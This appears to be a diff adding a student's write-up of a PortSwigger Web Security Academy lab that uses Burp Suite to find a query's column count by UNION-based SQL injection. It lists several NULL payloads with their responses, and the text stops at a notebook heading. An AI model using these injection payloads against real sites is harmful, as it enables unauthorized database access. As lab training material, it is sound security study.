@@ -1,0 +1,57 @@
+Objective
+
+Determine the number of columns returned by the SQL query using a UNION-based SQL Injection attack.
+
+Skills Learned
+SQL Injection basics
+UNION-based SQL Injection
+Using Burp Suite Repeater
+Determining the number of columns
+Understanding why NULL values are used
+Tools Used
+Burp Suite Community Edition
+PortSwigger Web Security Academy
+Google Chrome
+Method 1 – UNION SELECT NULL
+
+Tested different numbers of NULL values until the query executed successfully.
+
+Payloads used:
+
+' UNION SELECT NULL--
+
+❌ SQL Error
+
+' UNION SELECT NULL,NULL--
+
+❌ SQL Error
+
+' UNION SELECT NULL,NULL,NULL--
+
+✅ HTTP 200 OK
+
+' UNION SELECT NULL,NULL,NULL,NULL--
+
+❌ SQL Error
+
+Result
+
+The original SQL query returns 3 columns.
+
+Explanation
+
+The UNION operator requires both SELECT statements to return the same number of columns.
+
+NULL values are used because they are compatible with almost all SQL data types, making them ideal for determining the correct column count.
+
+Key Takeaways
+Always determine the number of columns before extracting data.
+Use NULL values to avoid data type mismatch errors.
+Burp Repeater is useful for testing SQL injection payloads interactively.
+Lab Status
+
+
+
+📒 Notes for Your Notebook
+SQL Injection – UNION Attack (Finding Number of Columns)
+Purpose
